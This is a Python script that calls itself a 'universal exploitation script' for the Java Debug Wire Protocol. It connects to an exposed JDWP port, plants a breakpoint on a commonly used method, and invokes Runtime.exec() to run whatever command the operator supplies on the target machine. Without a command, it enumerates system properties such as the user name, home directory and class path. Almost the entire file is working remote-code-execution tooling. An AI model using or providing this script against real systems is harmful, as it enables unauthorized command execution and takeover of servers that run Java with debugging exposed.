#!/usr/bin/env python3

# Built-in imports
import socket
import traceback
import sys
import time
import struct
import urllib.error
import argparse

# JDWP protocol variables
HANDSHAKE = b"JDWP-Handshake"

# Command signatures
VERSION_SIG = (1, 1)
CLASSESBYSIGNATURE_SIG = (1, 2)
ALLCLASSES_SIG = (1, 3)
ALLTHREADS_SIG = (1, 4)
IDSIZES_SIG = (1, 7)
CREATESTRING_SIG = (1, 11)
SUSPENDVM_SIG = (1, 8)
RESUMEVM_SIG = (1, 9)
SIGNATURE_SIG = (2, 1)
FIELDS_SIG = (2, 4)
METHODS_SIG = (2, 5)
GETVALUES_SIG = (2, 6)
CLASSOBJECT_SIG = (2, 11)
INVOKESTATICMETHOD_SIG = (3, 3)
REFERENCETYPE_SIG = (9, 1)
INVOKEMETHOD_SIG = (9, 6)
STRINGVALUE_SIG = (10, 1)
THREADNAME_SIG = (11, 1)
THREADSUSPEND_SIG = (11, 2)
THREADRESUME_SIG = (11, 3)
THREADSTATUS_SIG = (11, 4)
EVENTSET_SIG = (15, 1)
EVENTCLEAR_SIG = (15, 2)
EVENTCLEARALL_SIG = (15, 3)

# Other codes
MODKIND_COUNT = 1
MODKIND_THREADONLY = 2
MODKIND_CLASSMATCH = 5
MODKIND_LOCATIONONLY = 7
EVENT_BREAKPOINT = 2
SUSPEND_EVENTTHREAD = 1
SUSPEND_ALL = 2
NOT_IMPLEMENTED = 99
VM_DEAD = 112
INVOKE_SINGLE_THREADED = 2
TAG_OBJECT = 76
TAG_STRING = 115
TYPE_CLASS = 1


class JDWPClient:
    def __init__(self, host: str, port: int = 8000):
        """
        Initialize a JDWP (Java Debug Wire Protocol) client that connects to a specified host and port.

        Args:
            host (str): The hostname or IP address of the JDWP server to connect to.
            port (int, optional): The port number of the JDWP server. Defaults to 8000.
        """
        self._host = host
        self._port = port
        self._methods = {}
        self._fields = {}
        self._id = 0x01

        self._socket = None

    # Pubic methods
    def run(self, break_on_method: str, break_on_class: str, cmd: str) -> bool:
        """
        Sets up a breakpoint on a method, resumes the VM, waits for the breakpoint,
        then executes a command or prints system properties.
        """

        # 1. get Runtime class reference
        runtimeClass = self._get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print("[-] Cannot find class Runtime")
            return False
        print(f"[+] Found Runtime class: id={runtimeClass['refTypeId']:#x}")

        # 2. get getRuntime() meth reference
        self._get_methods(runtimeClass["refTypeId"])
        getRuntimeMeth = self._get_method_by_name("getRuntime")
        if getRuntimeMeth is None:
            print("[-] Cannot find method Runtime.getRuntime()")
            return False
        print(f"[+] Found Runtime.getRuntime(): id={getRuntimeMeth['methodId']:#x}")

        # 3. setup breakpoint on frequently called method
        c = self._get_class_by_name(break_on_class)
        if c is None:
            print(f"[-] Could not access class '{break_on_class}'")
            print("[-] It is possible that this class is not used by application")
            print("[-] Test with another one with option `--break-on`")
            return False

        self._get_methods(c["refTypeId"])
        m = self._get_method_by_name(break_on_method)
        if m is None:
            print(f"[-] Could not access method '{break_on_method}'")
            return False

        loc = bytes([TYPE_CLASS])
        loc += self._format(self.referenceTypeIDSize, c["refTypeId"])
        loc += self._format(self.methodIDSize, m["methodId"])
        loc += struct.pack(">II", 0, 0)
        data = [
            (MODKIND_LOCATIONONLY, loc),
        ]
        rId = self._send_event(EVENT_BREAKPOINT, *data)
        print(f"[+] Created break event id={rId:#x}")

        # 4. resume vm and wait for event
        self._resume_vm()

        print(f"[+] Waiting for an event on '{args.break_on_method}'")
        if args.break_on_method == "accept":
            print(
                f"[*] Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')"
            )
        while True:
            ret = self._parse_event_breakpoint(buf=self._wait_for_event(), event_id=rId)
            if ret is not None:
                rId, tId, loc = ret
                print(f"[+] Received matching event from thread {tId:#x}")
                break

        self._clear_event(EVENT_BREAKPOINT, rId)

        # 5. Now we can execute any code
        if cmd:
            self._exec_payload(
                tId,
                runtimeClass["refTypeId"],
                getRuntimeMeth["methodId"],
                cmd,
            )
        else:
            self._exec_info(tId)

        self._resume_vm()
        return True

    # Dunders
    def __repr__(self):
        return f"JDWPClient(host='{self._host}', port={self._port})"

    def __str__(self):
        return f"JDWPClient connected to {self._host}:{self._port}"

    def __enter__(self):
        self._handshake(self._host, self._port)
        self._get_id_sizes()
        self._get_version()
        self._get_loaded_classes()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        if self._socket:
            self._socket.close()
            self._socket = None

    # Private methods
    def _create_packet(self, cmdsig, data=b""):
        """
        Create a JDWP packet with the specified command signature and data.

        Args:
            cmdsig (tuple): A tuple containing the command set and the command within that set.
            data (bytes, optional): The data to be included in the packet. Defaults to an empty bytes object.

        Returns:
            bytes: A binary string representing the constructed JDWP packet.
        """
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        pkt = struct.pack(">IIBBB", pktlen, self._id, flags, cmdset, cmd)
        pkt += data
        self._id += 2
        return pkt

    def _read_reply(self) -> bytes:
        """
        Reads a reply from the JDWP server and returns the packet data.

        Raises:
            Exception: If an error code is received in the reply packet.

        Returns:
            bytes: The raw packet data received from the server.
        """
        # Receive the header from the socket
        header = self._socket.recv(11)
        if len(header) < 11:
            raise Exception("Incomplete reply header")

        # Unpack the header
        pktlen, id, flags, errcode = struct.unpack(">IIcH", header)

        # Check for reply packet type and error code
        if flags == b"\x80":  # b'\x80' is the flag for a reply packet
            if errcode != 0:
                raise Exception(f"Received error code {errcode}")

        # Initialize an empty bytes object for the buffer
        buf = b""
        while len(buf) + 11 < pktlen:
            data = self._socket.recv(1024)
            if data:
                buf += data
            else:
                # If no data is received, we wait a bit before trying again
                time.sleep(1)

        # Return the buffer of bytes
        return buf

    def _parse_entries(self, buf: bytes, formats: list, explicit: bool = True) -> list:
        """
        Parses entries from a buffer according to the given format specifiers.
        Supports explicit count of entries or assumes a single entry if not explicit.

        Args:
            buf (bytes): The buffer containing the data to parse.
            formats (list): A list of tuples where each tuple contains the format
                            specifier and the corresponding name of the field.
            explicit (bool): If True, expects the number of entries as the first
                            4 bytes of the buffer. Defaults to True.

        Returns:
            list: A list of dictionaries, each representing a parsed entry.
        """
        entries = []
        index = 0

        if explicit:
            (nb_entries,) = struct.unpack(">I", buf[:4])
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    (data[name],) = struct.unpack(">Q", buf[index : index + 8])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    (data[name],) = struct.unpack(">I", buf[index : index + 4])
                    index += 4
                elif fmt == "S":
                    (str_len,) = struct.unpack(">I", buf[index : index + 4])
                    data[name] = buf[index + 4 : index + 4 + str_len].decode("utf-8")
                    index += 4 + str_len
                elif fmt == "C":
                    (data[name],) = struct.unpack(">c", buf[index : index + 1])
                    index += 1
                elif fmt == "Z":
                    # Assuming this is a custom format and `_solve_string` is a method defined elsewhere.
                    (t,) = struct.unpack(">c", buf[index : index + 1])
                    index += 1
                    if t == b"s":
                        data[name] = self._solve_string(buf[index : index + 8])
                        index += 8
                    elif t == b"I":
                        (data[name],) = struct.unpack(">I", buf[index : index + 4])
                        index += 4
                else:
                    print(f"[x] Error: Unknown format {fmt}")
                    sys.exit(1)
            entries.append(data)

        return entries

    def _format(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)

        if fmt == "I" or fmt == 4:
            return struct.pack(">I", value)

        raise Exception("Unknown format")

    def _unformat(self, fmt, value):
        """
        Unpacks and converts a bytes object to a Python data type based on the given format.

        This method is used to convert bytes received from the server into a usable Python data type.
        It supports unpacking 64-bit and 32-bit unsigned integers.

        Args:
            fmt (str or int): The format character ('L' for 64-bit or 'I' for 32-bit unsigned integer)
                              or the size of the data to be unpacked (8 for 64-bit, 4 for 32-bit).
            value (bytes): The bytes object to be unpacked.

        Returns:
            int: The unpacked integer.

        Raises:
            ValueError: If the input bytes object does not contain enough bytes for the specified format.
            Exception: If the format is unknown or unsupported.
        """
        try:
            if fmt in ("L", 8):
                # Unpack a 64-bit unsigned integer from the beginning of the byte sequence.
                return struct.unpack(">Q", value[:8])[0]
            elif fmt in ("I", 4):
                # Unpack a 32-bit unsigned integer from the beginning of the byte sequence.
                return struct.unpack(">I", value[:4])[0]
            else:
                # Raise an exception if the format is not recognized.
                raise Exception(f"Unknown format: {fmt}")
        except struct.error as e:
            # Raise a more specific error if the bytes object is too short.
            raise ValueError(f"Insufficient bytes for format '{fmt}': {e}")

    def _handshake(self, host: str, port: int):
        """
        Establish a handshake with the JDWP server specified by the host and port.

        This method initiates a socket connection to the server and sends a handshake
        message. It then waits for a handshake response to confirm successful communication.

        Args:
            host (str): The hostname or IP address of the JDWP server to connect to.
            port (int): The port number on which the JDWP server is listening.

        Raises:
            Exception: If the socket connection fails, an exception with the error message is raised.
            Exception: If the handshake is not successful, an exception is raised.
        """
        print(f"[+] Target: {host}:{port}")
        # Create a new socket using the default family and socket type.
        current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print("[*] Trying to connect...")
            current_socket.connect((host, port))
        except socket.error as msg:
            raise Exception(f"Failed to connect: {msg}")
        else:
            print("[+] Connection successful!")

        # Send the predefined handshake message to the server.
        current_socket.send(HANDSHAKE)
        print("[+] Handshake sent")

        # Wait for the server to send back the handshake message.
        received_handshake = current_socket.recv(len(HANDSHAKE))

        # Check if the received message matches the handshake message.
        if received_handshake != HANDSHAKE:
            # If it doesn't match, close the socket and raise an exception.
            current_socket.close()
            raise Exception("Failed to handshake with the server.")

        # If the handshake is successful, store the socket for future communication.
        self._socket = current_socket
        print("[+] Handshake successful")

    def _get_version(self):
        """
        Requests the JDWP and VM version information from the server.

        This method sends a packet with the version signature to the server,
        then reads the reply and sets the corresponding attributes on the client
        with the server's JDWP protocol version and VM version details.

        Raises:
            Exception: If there is an error in reading the reply from the server.

        Returns:
            None: This method sets attributes on the client instance and does not return anything.
        """
        # Send a packet with the version signature to the server.
        print("[*] Requesting version information from the JDWP server...")
        self._socket.sendall(self._create_packet(VERSION_SIG))

        try:
            # Read the reply from the server.
            buf = self._read_reply()
        except Exception as error:
            # If there's an error reading the reply, print an error message and re-raise the exception.
            print(f"[!] Error reading version information: {error}")
            raise

        # Define the format for parsing the version information.
        formats = [
            ("S", "description"),
            ("I", "jdwpMajor"),
            ("I", "jdwpMinor"),
            ("S", "vmVersion"),
            ("S", "vmName"),
        ]

        # Parse the entries and set the attributes on the client instance.
        for entry in self._parse_entries(buf, formats, False):
            for name, value in entry.items():
                setattr(self, name, value)
                print(f"\t• {name}: {value}")

        print("[+] Version information has been successfully received and set.")

    def _get_id_sizes(self):
        """
        Requests the sizes of various ID types from the JDWP server.

        This method sends a packet with the ID sizes signature to the server,
        then reads the reply and sets the corresponding attributes on the client.

        Raises:
            Exception: If there is an error in reading the reply from the server.

        Returns:
            None: This method sets attributes on the client instance and does not return anything.
        """
        # Send a packet with the ID sizes signature to the server.
        print("[*] Requesting ID sizes from the JDWP server...")
        self._socket.sendall(self._create_packet(IDSIZES_SIG))

        try:
            # Read the reply from the server.
            buf = self._read_reply()
        except Exception as error:
            # If there's an error reading the reply, print an error message and re-raise the exception.
            print(f"[!] Error reading ID sizes: {error}")
            raise

        # Define the format for parsing the ID sizes.
        formats = [
            ("I", "fieldIDSize"),
            ("I", "methodIDSize"),
            ("I", "objectIDSize"),
            ("I", "referenceTypeIDSize"),
            ("I", "frameIDSize"),
        ]

        # Parse the entries and set the attributes on the client instance.
        for entry in self._parse_entries(buf, formats, False):
            for name, value in entry.items():
                setattr(self, name, value)
                print(f"\t• {name}: {value}")

        print("[+] ID sizes have been successfully received and set.")

    def _all_threads(self) -> list:
        """
        Retrieve information about all threads from the JDWP server.

        Returns:
            list: A list of dictionaries containing thread information.
        """
        if hasattr(self, "threads"):
            return self.threads

        self._socket.sendall(self._create_packet(ALLTHREADS_SIG))
        buf = self._read_reply()
        formats = [(self.objectIDSize, "threadId")]
        self.threads = self._parse_entries(buf, formats)
        return self.threads

    def _get_thread_by_name(self, name: str):
        """
        Find a thread by its name.

        Args:
            name (str): The name of the thread to search for.

        Returns:
            dict or None: A dictionary containing thread information if found, or None if not found.
        """
        self._all_threads()
        for t in self.threads:
            threadId = self._format(self.objectIDSize, t["threadId"])
            self._socket.sendall(self._create_packet(THREADNAME_SIG, data=threadId))
            buf = self._read_reply()
            if len(buf) and name == self._read_string(buf):
                return t
        return None

    def _get_loaded_classes(self):
        """
        Retrieves a list of all classes currently loaded by the JVM.

        This method sends a command to request all classes from the JVM and parses the response.
        It caches the result to prevent unnecessary network traffic on subsequent calls.

        Returns:
            list: A list of dictionaries, each containing details of a class such as type tag, type ID,
                  signature, and status.

        Raises:
            Exception: If there's a failure in sending the command or receiving/parsing the response.
        """
        # Check if the classes have already been retrieved and cached.
        if not hasattr(self, "classes"):
            # Send the command to get all classes.
            self._socket.sendall(self._create_packet(ALLCLASSES_SIG))
            # Read the reply from the server.
            buf = self._read_reply()
            # Define the format for each class entry.
            formats = [
                ("C", "refTypeTag"),
                (self.referenceTypeIDSize, "refTypeId"),
                ("S", "signature"),
                ("I", "status"),
            ]
            # Parse the entries and cache the results.
            self.classes = self._parse_entries(buf, formats)

        # Return the cached list of classes.
        return self.classes

    def _get_class_by_name(self, name: str):
        """
        Find a class by its name.

        Args:
            name (str): The name of the class to search for.

        Returns:
            dict or None: A dictionary containing class information if found, or None if not found.
        """
        for entry in self.classes:
            if entry["signature"].lower() == name.lower():
                return entry
        return None

    def _get_methods(self, refTypeId: int):
        """
        Retrieve methods associated with a reference type.

        Args:
            refTypeId (int): The reference type ID for which to retrieve methods.

        Returns:
            list: A list of dictionaries containing method information.
        """
        if refTypeId not in self._methods:
            refId = self._format(self.referenceTypeIDSize, refTypeId)
            self._socket.sendall(self._create_packet(METHODS_SIG, data=refId))
            buf = self._read_reply()
            formats = [
                (self.methodIDSize, "methodId"),
                ("S", "name"),
                ("S", "signature"),
                ("I", "modBits"),
            ]
            self._methods[refTypeId] = self._parse_entries(buf, formats)
        return self._methods[refTypeId]

    def _get_method_by_name(self, name: str):
        """
        Find a method by its name.

        Args:
            name (str): The name of the method to search for.

        Returns:
            dict or None: A dictionary containing method information if found, or None if not found.
        """
        for refId in list(self._methods.keys()):
            for entry in self._methods[refId]:
                if entry["name"].lower() == name.lower():
                    return entry
        return None

    def _get_fields(self, refTypeId):
        if refTypeId not in self._fields:
            refId = self._format(self.referenceTypeIDSize, refTypeId)
            self._socket.sendall(self._create_packet(FIELDS_SIG, data=refId))
            buf = self._read_reply()
            formats = [
                (self.fieldIDSize, "fieldId"),
                ("S", "name"),
                ("S", "signature"),
                ("I", "modbits"),
            ]
            self._fields[refTypeId] = self._parse_entries(buf, formats)
        return self._fields[refTypeId]

    def _get_value(self, refTypeId, fieldId):
        data = self._format(self.referenceTypeIDSize, refTypeId)
        data += struct.pack(">I", 1)
        data += self._format(self.fieldIDSize, fieldId)
        self._socket.sendall(self._create_packet(GETVALUES_SIG, data=data))
        buf = self._read_reply()
        formats = [("Z", "value")]
        field = self._parse_entries(buf, formats)[0]
        return field

    def _create_string(self, data: bytes):
        buf = self._build_string(data)
        self._socket.sendall(self._create_packet(CREATESTRING_SIG, data=buf))
        buf = self._read_reply()
        return self._parse_entries(buf, [(self.objectIDSize, "objId")], False)

    def _build_string(self, data: bytes):
        return struct.pack(">I", len(data)) + data

    def _read_string(self, data):
        size = struct.unpack(">I", data[:4])[0]
        return data[4 : 4 + size]

    def _suspend_vm(self):
        self._socket.sendall(self._create_packet(SUSPENDVM_SIG))
        print("[+] Suspend VM signal sent")
        self._read_reply()

    def _resume_vm(self) -> None:
        self._socket.sendall(self._create_packet(RESUMEVM_SIG))
        print("[+] Resume VM signal sent")
        self._read_reply()

    def _invoke_static(self, classId, threadId, methId, *args):
        data = self._format(self.referenceTypeIDSize, classId)
        data += self._format(self.objectIDSize, threadId)
        data += self._format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self._socket.sendall(self._create_packet(INVOKESTATICMETHOD_SIG, data=data))
        buf = self._read_reply()
        return buf

    def _invoke(self, objId, threadId, classId, methId, *args):
        data = self._format(self.objectIDSize, objId)
        data += self._format(self.objectIDSize, threadId)
        data += self._format(self.referenceTypeIDSize, classId)
        data += self._format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self._socket.sendall(self._create_packet(INVOKEMETHOD_SIG, data=data))
        buf = self._read_reply()
        return buf

    def _solve_string(self, objId):
        self._socket.sendall(self._create_packet(STRINGVALUE_SIG, data=objId))
        buf = self._read_reply()
        if len(buf):
            return self._read_string(buf)

        return ""

    def _query_thread(self, threadId, kind):
        data = self._format(self.objectIDSize, threadId)
        self._socket.sendall(self._create_packet(kind, data=data))
        self._read_reply()
        return

    def _suspend_thread(self, threadId):
        return self._query_thread(threadId, THREADSUSPEND_SIG)

    def _status_thread(self, threadId):
        return self._query_thread(threadId, THREADSTATUS_SIG)

    def _resume_thread(self, threadId):
        return self._query_thread(threadId, THREADRESUME_SIG)

    def _send_event(self, event_code, *args):
        """
        Sends an event to the JDWP server.

        Args:
            event_code (int): The event code corresponding to the event to be sent.
            *args: Variable length argument list representing the event arguments.

        Returns:
            int: The request ID from the event sent.

        Raises:
            Exception: If sending the event or reading the reply fails.
        """
        data = bytes([event_code, SUSPEND_ALL]) + struct.pack(">I", len(args))

        for kind, option in args:
            data += bytes([kind]) + option

        self._socket.sendall(self._create_packet(EVENTSET_SIG, data=data))
        buf = self._read_reply()
        return struct.unpack(">I", buf)[0]

    def _clear_event(self, event_code, request_id):
        """
        Clears a set event from the JDWP server.

        Args:
            event_code (int): The event code corresponding to the event to be cleared.
            request_id (int): The request ID of the event to clear.

        Raises:
            Exception: If clearing the event or reading the reply fails.
        """
        data = bytes([event_code]) + struct.pack(">I", request_id)
        self._socket.sendall(self._create_packet(EVENTCLEAR_SIG, data=data))
        self._read_reply()

    def _clear_events(self):
        """
        Clears all set events from the JDWP server.

        Raises:
            Exception: If clearing the events or reading the reply fails.
        """
        self._socket.sendall(self._create_packet(EVENTCLEARALL_SIG))
        self._read_reply()

    def _wait_for_event(self):
        """
        Waits and reads the next event from the JDWP server.

        Returns:
            bytes: The raw event data received.

        Raises:
            Exception: If reading the event fails.
        """
        buf = self._read_reply()
        return buf

    def _parse_event_breakpoint(self, buf, event_id):
        """
        Parses a breakpoint event received from the JDWP server.

        Args:
            buf (bytes): The buffer containing the event data.
            event_id (int): The ID of the event to parse.

        Returns:
            tuple: A tuple containing the request ID, thread ID, and location (-1 since it's not used) if the event IDs match.
            None: If the received event ID does not match the expected event_id.

        Raises:
            Exception: If unpacking the buffer fails.
        """
        received_id = struct.unpack(">I", buf[6:10])[0]
        if received_id != event_id:
            return None
        thread_id = self._unformat(self.objectIDSize, buf[10 : 10 + self.objectIDSize])
        location = -1  # not used in this context
        return received_id, thread_id, location

    def _exec_info(self, threadId: int):
        #
        # This function calls java.lang.System.getProperties() and
        # displays OS properties (non-intrusive)
        #
        properties = {
            "java.version": "Java Runtime Environment version",
            "java.vendor": "Java Runtime Environment vendor",
            "java.vendor.url": "Java vendor URL",
            "java.home": "Java installation directory",
            "java.vm.specification.version": "Java Virtual Machine specification version",
            "java.vm.specification.vendor": "Java Virtual Machine specification vendor",
            "java.vm.specification.name": "Java Virtual Machine specification name",
            "java.vm.version": "Java Virtual Machine implementation version",
            "java.vm.vendor": "Java Virtual Machine implementation vendor",
            "java.vm.name": "Java Virtual Machine implementation name",
            "java.specification.version": "Java Runtime Environment specification version",
            "java.specification.vendor": "Java Runtime Environment specification vendor",
            "java.specification.name": "Java Runtime Environment specification name",
            "java.class.version": "Java class format version number",
            "java.class.path": "Java class path",
            "java.library.path": "List of paths to search when loading libraries",
            "java.io.tmpdir": "Default temp file path",
            "java.compiler": "Name of JIT compiler to use",
            "java.ext.dirs": "Path of extension directory or directories",
            "os.name": "Operating system name",
            "os.arch": "Operating system architecture",
            "os.version": "Operating system version",
            "file.separator": "File separator",
            "path.separator": "Path separator",
            "user.name": "User's account name",
            "user.home": "User's home directory",
            "user.dir": "User's current working directory",
        }

        systemClass = self._get_class_by_name("Ljava/lang/System;")
        if systemClass is None:
            print("[-] Cannot find class java.lang.System")
            return False

        self._get_methods(systemClass["refTypeId"])
        getPropertyMeth = self._get_method_by_name("getProperty")
        if getPropertyMeth is None:
            print("[-] Cannot find method System.getProperty()")
            return False

        for propStr, propDesc in properties.items():
            propObjIds = self._create_string(propStr)
            if len(propObjIds) == 0:
                print("[-] Failed to allocate command")
                return False
            propObjId = propObjIds[0]["objId"]

            data = [
                chr(TAG_OBJECT) + self._format(self.objectIDSize, propObjId),
            ]
            buf = self._invoke_static(
                systemClass["refTypeId"], threadId, getPropertyMeth["methodId"], *data
            )
            if buf[0] != chr(TAG_STRING):
                print(("[-] %s: Unexpected returned type: expecting String" % propStr))
            else:
                retId = self._unformat(
                    self.objectIDSize, buf[1 : 1 + self.objectIDSize]
                )
                res = self._solve_string(self._format(self.objectIDSize, retId))
                print(f"[+] Found {propDesc} '{res}'")

        return True

    def _exec_payload(
        self,
        thread_id: int,
        runtime_class_id: int,
        get_runtime_meth_id: int,
        command: str,
    ) -> bool:
        """
        Invokes a command on the JVM target using the JDWP protocol. This command will execute with JVM privileges.

        Args:
            thread_id (int): The identifier of the thread where the method will be invoked.
            runtime_class_id (int): The identifier of the Runtime class in the target JVM.
            get_runtime_meth_id (int): The identifier of the getRuntime method of the Runtime class.
            command (str): The command string to execute on the JVM.

        Raises:
            Exception: If any JDWP operation fails or the expected response is not received.

        Returns:
            bool: True if the command was successfully executed, False otherwise.
        """
        print(f"[+] Payload to send: '{command}'")

        command = command.encode(encoding="utf-8")

        # Allocate string containing our command to exec()
        cmd_obj_ids = self._create_string(command)
        if not cmd_obj_ids:
            raise Exception("Failed to allocate command string on target JVM")
        cmd_obj_id = cmd_obj_ids[0]["objId"]
        print(f"[+] Command string object created id:{cmd_obj_id:x}")

        # Use context to get Runtime object
        buf = self._invoke_static(runtime_class_id, thread_id, get_runtime_meth_id)
        if buf[0] != TAG_OBJECT:
            raise Exception(
                "Unexpected return type from _invoke_static: expected Object"
            )
        rt = self._unformat(self.objectIDSize, buf[1 : 1 + self.objectIDSize])

        if rt is None:
            raise Exception("Failed to _invoke Runtime.getRuntime() method")

        print(f"[+] Runtime.getRuntime() returned context id:{rt:#x}")

        # Find exec() method
        exec_meth = self._get_method_by_name("exec")
        if exec_meth is None:
            raise Exception("Runtime.exec() method not found")
        print(f"[+] Found Runtime.exec(): id={exec_meth['methodId']:x}")

        # Call exec() in this context with the allocated string
        data = [
            struct.pack(">B", TAG_OBJECT) + self._format(self.objectIDSize, cmd_obj_id)
        ]
        buf = self._invoke(
            rt, thread_id, runtime_class_id, exec_meth["methodId"], *data
        )
        if buf[0] != TAG_OBJECT:
            raise Exception(
                "Unexpected return type from Runtime.exec(): expected Object"
            )

        ret_id = self._unformat(self.objectIDSize, buf[1 : 1 + self.objectIDSize])
        print(f"[+] Runtime.exec() successful, retId={ret_id:x}")
        return True

    # Properties
    @property
    def version(self) -> str:
        return f"{self.vmName} - {self.vmVersion}"


def convert_to_jdwp_format(input_string: str) -> tuple:
    """
    Convert a fully-qualified class name and method name into JDWP format.

    This function takes a string representing a fully-qualified class name and method name
    and converts it into the format used in JDWP (Java Debug Wire Protocol) for class and
    method references.

    Args:
        input_string (str): The fully-qualified class name and method name in the format "package.ClassName.method".

    Returns:
        tuple: A tuple containing two elements:
            - A string representing the JDWP format for the class reference.
            - A string representing the JDWP format for the method reference.

    Raises:
        ValueError: If the input string is not in the expected format.

    Example:
        Input: "com.example.MyClass.myMethod"
        Output: ("Lcom/example/MyClass;", "myMethod")
    """
    i = input_string.rfind(".")
    if i == -1:
        raise ValueError("Invalid input format. Cannot parse path.")

    method = input_string[i + 1 :]
    class_name = "L" + input_string[:i].replace(".", "/") + ";"
    return class_name, method


def main(
    target: str, port: int, break_on_method: str, break_on_class: str, cmd: str
) -> None:
    """
    JDWP Exploitation Main Function

    This function connects to a JDWP server, sets up breakpoints, and executes commands
    on the target Java application using the JDWP protocol.

    Args:
        target (str): The hostname or IP address of the JDWP server to connect to.
        port (int): The port number on which the JDWP server is listening.
        break_on_method (str): The name of the method in the target Java application where
            a breakpoint should be set.
        break_on_class (str): The name of the class in the target Java application where
            the breakpoint should be set.
        cmd (str): The command to execute on the target Java application if the breakpoint is hit.

    Returns:
        None

    Raises:
        KeyboardInterrupt: If the user interrupts the execution.
        Exception: If any unexpected exceptions occur during execution.
    """
    try:
        with JDWPClient(target, port) as cli:
            if not cli.run(
                break_on_method=break_on_method, break_on_class=break_on_class, cmd=cmd
            ):
                print("[-] Exploit failed")
                return

    except KeyboardInterrupt:
        print("[+] Exiting on user's request")
        return

    except Exception:
        print("[x] An unexpected exception occurred during execution:")
        traceback.print_exc()
        return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Universal exploitation script for JDWP",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "-t",
        "--target",
        type=str,
        metavar="IP",
        help="Remote target IP",
        required=False,
        default="0.0.0.0",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        metavar="PORT",
        default=8000,
        required=False,
        help="Remote target port",
    )

    parser.add_argument(
        "--break-on",
        dest="break_on",
        type=str,
        metavar="JAVA_METHOD",
        default="java.net.ServerSocket.accept",
        required=False,
        help="Specify full path to method to break on",
    )
    parser.add_argument(
        "-c",
        "--cmd",
        dest="cmd",
        type=str,
        metavar="COMMAND",
        required=False,
        help="Specify command to execute remotely",
    )

    args = parser.parse_args()

    classname, meth = convert_to_jdwp_format(args.break_on)
    setattr(args, "break_on_class", classname)
    setattr(args, "break_on_method", meth)

    main(
        target=args.target,
        port=args.port,
        break_on_method=args.break_on_method,
        break_on_class=args.break_on_class,
        cmd=args.cmd,
    )
